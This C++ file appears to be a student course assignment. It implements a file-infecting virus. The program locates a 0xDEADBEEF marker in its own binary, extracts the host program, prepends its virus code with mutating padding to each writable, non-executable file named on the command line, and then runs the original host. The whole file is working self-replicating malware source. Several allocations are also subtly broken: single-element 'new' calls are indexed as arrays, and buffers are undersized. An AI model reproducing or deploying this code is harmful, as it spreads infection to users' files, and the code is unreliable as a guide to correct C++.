// ---------------------------------------------
// NAME: Kirk Thelen           User ID: klthelen
// DUE DATE: 11/11/2022
// PROJ2
// FILE NAME: virus.cpp
// PROGRAM PURPOSE:
//    This program is the virus. It is nice,
//    but it will spread to any writable and
//    non-executable files passed to its argv.
// ---------------------------------------------

#include <iostream>  // std::cout
#include <stdlib.h>  // atoi
#include <string>    // std::string
#include <string.h>  // strlen
#include <fstream>   // ofstream
#include <fcntl.h>   // open
#include <unistd.h>  // read, stat, access, execve
#include <iomanip>   // setw
#include <sys/types.h> // stat
#include <sys/stat.h>  // stat
#include <sys/wait.h>  // wait

int main(int argc, char *argv[], char *envp[]) {
  // ********** VIRUS OPENS ITSELF ********** //
  int deadbeefFile;
  if ((deadbeefFile = open(argv[0], O_RDONLY)) < 0) {
    // Failed to open the infected file
    return 1;
  }

  unsigned char *deadbeefArray = new unsigned char(4);  // array for last 4 bytes read
  int pos = 0;                                          // current position in (circular) array
  unsigned char *buf = new unsigned char;               // buffer for read()
  int bytesRead = 0;                                    // number of bytes read to find 0xdeadbeef (or eof)
  // Initialize array
  for (int i = 0; i < 4; i++) {
    deadbeefArray[i] = 0;
  }

  // ********** FIND 0xDEADBEEF IN FILE ********** //
  while (read(deadbeefFile, buf, 1) > 0) {             // read 1 byte at a time until EOF
    // Keep track of the bytes read and see if we have made deadbeef
    // This means we are looking for the unsigned char values:
    //    0xde = 222
    //    0xad = 173
    //    0xbe = 190
    //    0xef = 239

    // Save byte into our array, increment our currentPosition, check if we go out of bounds
    // if so, move back to the start of the (circular) array
    bytesRead++;
    deadbeefArray[pos] = *buf;
    pos++;
    if (pos > 3) {
      pos = 0;
    }

    // If we see '0xef' then we can check for '0xdeadbeef'
    // We already saved '0xef' in the last spot and moved our pos forward
    // -> we should be on '0xde' and be able to read 4 bytes in our circular array that spell
    //    '0xdeadbeef' if we have found it
    // We need to be careful not to mess up our position in our array, so we'll use a separate position
    // variable to check our array for 0xdeadbeef, and then if we don't find it we will just resume where
    // we left off with the original pos variable
    if (*buf == (unsigned char)239) {
      int checkingPos = pos;
      if (deadbeefArray[checkingPos] == (unsigned char)222) {
	checkingPos++;
	if (checkingPos > 3) {
	  checkingPos = 0;
	}
	if (deadbeefArray[checkingPos] == (unsigned char)173) {
	  checkingPos++;
	  if (checkingPos > 3) {
	    checkingPos = 0;
	  }
	  if (deadbeefArray[checkingPos] == (unsigned char)190) {
	    // 0xdeadbeef found
	    break;
	  }
	}
      }
    }   
  }

  // Create a temporary file to copy the uninfected application code
  char* temp = tmpnam(nullptr);
  char* start = temp;
  temp += 5;
  
  if (temp == nullptr) {
    close(deadbeefFile);
    delete deadbeefArray;
    return 1;
  }
  
  // Open temporary file to hold uninfected (payload) binary
  int payload;
  payload = open(temp, O_CREAT | O_TRUNC | O_RDWR, 0777);
  if (payload < 0) {
    close(deadbeefFile);
    delete deadbeefArray;
    close(payload);
    return 1;
  }

  // Copy the payload binary
  while(read(deadbeefFile, buf, 1) > 0) {
    // Simply copying the rest of the bytes from the file into this new file
    write(payload, buf, 1);
  }
  close(payload);
  
  // Figure out which, if any, files in argv[] are infectible
  if (argc > 1) {
    bool *infectible = new bool(argc);
    infectible[0] = 0;
    for (int i = 1; i < argc; i++) {
      if (!access(argv[i], W_OK)) {
	if (!access(argv[i], X_OK)) {
	  infectible[i] = false;
	}
	else {
	  infectible[i] = true;
	}
      }
      else {
	infectible[i] = false;
      }
    }

    // Now we can infect the infectible files
    for (int i = 1; i < argc; i++) {
      if (infectible[i]) {
	// Open the victim file
	int victim;
	if ((victim = open(argv[i], O_RDWR)) >= 0) {
	  // Proceed if there are no problems opening the file

	  // Get the file status of the victim
	  struct stat stat;
	  fstat(victim, &stat);
	  int length = stat.st_size;   // Size of victim binary

	  // Allocate map
	  void *map;
	  map = (char*)malloc(length);
	  if (!map) {
	    close(victim);
	  }
	  else {
	    // Copy victim binary into map
	    for (int j = 0; j < length; j++) {
	      read(victim, map+j, 1);
	    }
	    lseek(victim, 0, SEEK_SET);

	    // Only infect if the victim has not been infected yet
	    // So, we search for 0xDEADBEEF just like before
	    bool deadbeefFound = false;
	    int victimBytesRead = 0;
	    while (read(victim, buf, 1) > 0) {             // read 1 byte at a time until EOF
	      deadbeefArray[pos] = *buf;
	      victimBytesRead++;
	      pos++;
	      if (pos > 3) {
		pos = 0;
	      }
	      
	      if (*buf == (unsigned char)239) {
		int checkingPos = pos;
		if (deadbeefArray[checkingPos] == (unsigned char)222) {
		  checkingPos++;
		  if (checkingPos > 3) {
		    checkingPos = 0;
		  }
		  if (deadbeefArray[checkingPos] == (unsigned char)173) {
		    checkingPos++;
		    if (checkingPos > 3) {
		      checkingPos = 0;
		    }
		    if (deadbeefArray[checkingPos] == (unsigned char)190) {
		      // 0xdeadbeef found
		      deadbeefFound = true;
		      break;
		    }
		  }
		}
	      }   
	    }
	    lseek(victim, 0, SEEK_SET);
	    if (ftruncate(victim, 0)) {
	      close(victim);
	    }
	    if(deadbeefFound) {
	      // We can skip copying the virus because it's already there
	      // So, we just copy the rest of the file like normal
	      for(int b = 0; b < length; b++) {
		write(victim, map+b, 1);
	      }
	      free(map);
	      close(victim);
	    }
	    else {
	      // Copy virus portion of this binary to victim file
	      // victim points to the beginning of the victim file
	      int done = 0;
	      lseek(deadbeefFile, 0, SEEK_SET);      
	      // deadbeefFile now points to the beginning of the infected file
	      
	      int b = 0;
	      while(done < bytesRead-4) {
		// Read up to just before 0xDEADBEEF and copy it into the new file
		b = read(deadbeefFile, buf, 1);
		write(victim, buf, b);
		done += b;
	      }
	      
	      // We will mutate by continuously adding additional "0000" to the end of the virus
	      write(victim, "\x00\x00", 2);
	      
	      // The last 4 bytes are 0xdeadbeef
	      //write(victim, "\xde\xad\xbe\xef", 4);
	      b = read(deadbeefFile, buf, 1);
	      write(victim, buf, b);
	      b = read(deadbeefFile, buf, 1);
	      write(victim, buf, b);
	      b = read(deadbeefFile, buf, 1);
	      write(victim, buf, b);
	      b = read(deadbeefFile, buf, 1);
	      write(victim, buf, b);
	      
	      // Copy uninfected binary contents to victim binary file
	      for(b = 0; b < length; b++) {
		write(victim, map+b, 1);
	      }
	      free(map);
	      close(victim);
	    }
	  }
	}
      }
    }
  }
  
  // Need to run the uninfected part of this binary still
  int pid;
  pid = fork();
  
  if (pid == 0) {
    char *executable = new char(strlen(temp) + 5);
    strcpy(executable, "./");
    strcat(executable, temp);
    int err = execvp(executable, argv);
    exit(127);
  }

  // Parent waits for child
  while (wait(nullptr) > 0) {
    // Just waiting
  }

  // Clean up temp file
  remove(temp);
  delete deadbeefArray;
  delete buf;
  close(deadbeefFile);
  return 1;
}
